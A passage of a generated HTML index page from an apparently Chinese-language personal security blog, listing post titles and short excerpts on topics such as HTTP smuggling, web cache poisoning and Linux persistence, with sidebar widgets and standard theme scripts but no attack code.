article-meta__icon"></i><a class="article-meta__tags" href="/tags/binary/">binary</a></span></div><div class="content">调试一个double free问题</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/09/05/linux-fd/" title="linux中的pipe与fd">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux中的pipe与fd"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/09/05/linux-fd/" title="linux中的pipe与fd">linux中的pipe与fd</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-05T08:12:33.000Z" title="发表于 2020-09-05 16:12:33">2020-09-05</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T06:37:49.630Z" title="更新于 2020-11-25 14:37:49">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/code/">code</a></span></div><div class="content">最近写程序的时候，在处理c在linux下的pipe时，遇到了一些问题，为了防止老年痴呆所带来的记忆错乱，故而趁热写个备忘。</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/08/25/Web-Cache-Poisoning/" title="WEB缓存投毒攻击技术">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEB缓存投毒攻击技术"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/25/Web-Cache-Poisoning/" title="WEB缓存投毒攻击技术">WEB缓存投毒攻击技术</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-25T03:02:20.000Z" title="发表于 2020-08-25 11:02:20">2020-08-25</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:33:52.174Z" title="更新于 2020-11-25 18:33:52">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">继续总结一下另一种缺乏重视的攻击技术----Web Cache Posioning</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/08/24/HTTP-Smuggling/" title="HTTP Smuggling攻击">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP Smuggling攻击"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/24/HTTP-Smuggling/" title="HTTP Smuggling攻击">HTTP Smuggling攻击</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-24T07:34:57.000Z" title="发表于 2020-08-24 15:34:57">2020-08-24</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:30:42.486Z" title="更新于 2020-11-25 18:30:42">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">总结一下自己学习HTTP Smuggling相关的要点及技巧，致敬albinowax</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/08/24/Socks5-UDP/" title="Socks5中UDP Associate特性实现与trick">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Socks5中UDP Associate特性实现与trick"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/24/Socks5-UDP/" title="Socks5中UDP Associate特性实现与trick">Socks5中UDP Associate特性实现与trick</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-24T06:13:27.000Z" title="发表于 2020-08-24 14:13:27">2020-08-24</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T06:39:16.261Z" title="更新于 2020-11-25 14:39:16">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/code/">code</a></span></div><div class="content">最近有师傅在我的repo下提了个issue，希望我能加入特性以支持socks5的udp代理，即UDP Associate特性，而这个特性在网上找到的资料也比较少，绝大多数的开源socks5服务器也并不支持这样的特性，故而特以此记录踩坑经历和简单阐述实现过程</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/06/17/Hackerone-Knowledege/" title="Hackerone-Knowledege">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hackerone-Knowledege"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/17/Hackerone-Knowledege/" title="Hackerone-Knowledege">Hackerone-Knowledege</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-06-17T06:20:20.000Z" title="发表于 2020-06-17 14:20:20">2020-06-17</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T06:35:47.108Z" title="更新于 2020-11-25 14:35:47">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/">赏金猎人</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/bug-bounty/">bug bounty</a></span></div><div class="content">记录一些hackerone上面的骚操作</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/06/04/Linux-backdoors/" title="Linux后门权限维持">     <img class="post_bg" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux后门权限维持"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/04/Linux-backdoors/" title="Linux后门权限维持">Linux后门权限维持</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-06-04T04:03:49.000Z" title="发表于 2020-06-04 12:03:49">2020-06-04</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-25T10:31:16.428Z" title="更新于 2020-11-25 18:31:16">2020-11-25</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/pentest/">pentest</a></span></div><div class="content">记录一下常见的linux上获得root权限后，不利用RAT维持权限的方法，并做一些分析记录</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ph4ntom</div><div class="author-info__description">The wheel turns,nothing is ever new</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ph4ntonn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客～</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2020/11/13/ret2dl/" title="ret2dl"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2dl"/></a><div class="content"><a class="title" href="/2020/11/13/ret2dl/" title="ret2dl">ret2dl</a><time datetime="2020-11-13T03:45:20.000Z" title="发表于 2020-11-13 11:45:20">2020-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/11/bypass-Canary/" title="bypass Canary"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bypass Canary"/></a><div class="content"><a class="title" href="/2020/11/11/bypass-Canary/" title="bypass Canary">bypass Canary</a><time datetime="2020-11-11T10:19:56.000Z" title="发表于 2020-11-11 18:19:56">2020-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/10/24/ptmalloc/" title="ptmalloc机制闲扯"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ptmalloc机制闲扯"/></a><div class="content"><a class="title" href="/2020/10/24/ptmalloc/" title="ptmalloc机制闲扯">ptmalloc机制闲扯</a><time datetime="2020-10-24T13:40:30.000Z" title="发表于 2020-10-24 21:40:30">2020-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/10/23/Double-free/" title="Double free"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Double free"/></a><div class="content"><a class="title" href="/2020/10/23/Double-free/" title="Double free">Double free</a><time datetime="2020-10-23T11:08:20.000Z" title="发表于 2020-10-23 19:08:20">2020-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/09/05/linux-fd/" title="linux中的pipe与fd"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux中的pipe与fd"/></a><div class="content"><a class="title" href="/2020/09/05/linux-fd/" title="linux中的pipe与fd">linux中的pipe与fd</a><time datetime="2020-09-05T08:12:33.000Z" title="发表于 2020-09-05 16:12:33">2020-09-05</time></div></div></div></div></div><div class="card-widget card-categories"><div class="card-content"><div class="item-headline"><i class="fas fa-folder-open"></i><span>分类</span></div><ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">WEB安全</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">Web安全</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">二进制安全</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F/"><span class="card-category-list-name">渗透</span><span class="card-category-list-count">5</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/"><span class="card-category-list-name">编程</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/"><span class="card-category-list-name">赏金猎人</span><span class="card-category-list-count">1</span></a></li>
+            
+            </ul></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/binary/" style="font-size: 1.37em; color: #99a4b2">binary</a> <a href="/tags/bug-bounty/" style="font-size: 1.1em; color: #999">bug bounty</a> <a href="/tags/code/" style="font-size: 1.37em; color: #99a4b2">code</a> <a href="/tags/pentest/" style="font-size: 1.5em; color: #99a9bf">pentest</a> <a href="/tags/web/" style="font-size: 1.23em; color: #999ea6">web</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">十一月 2020</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/10/"><span class="card-archive-list-date">十月 2020</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/09/"><span class="card-archive-list-date">九月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">八月 2020</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/06/"><span class="card-archive-list-date">六月 2020</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/05/"><span class="card-archive-list-date">五月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/04/"><span class="card-archive-list-date">四月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/03/"><span class="card-archive-list-date">三月 2020</span><span class="card-archive-list-count">4</span></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">16</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">37.6k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2020-11-25T10:56:42.680Z"></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/bg1.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By ph4ntom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>function subtitleType () {
+  if (true) { 
+    var typed = new Typed("#subtitle", {
+      strings: "The wheel turns&#44;nothing is ever new".split(","),
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: false,
+      backSpeed: 50
+    })
+  } else {
+    document.getElementById("subtitle").innerHTML = 'The wheel turns&#44;nothing is ever new'
+  }
+}
+
+if (true) {
+  if (typeof Typed === 'function') subtitleType()
+  else $.getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js', subtitleType)
+} else {
+  subtitleType()
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
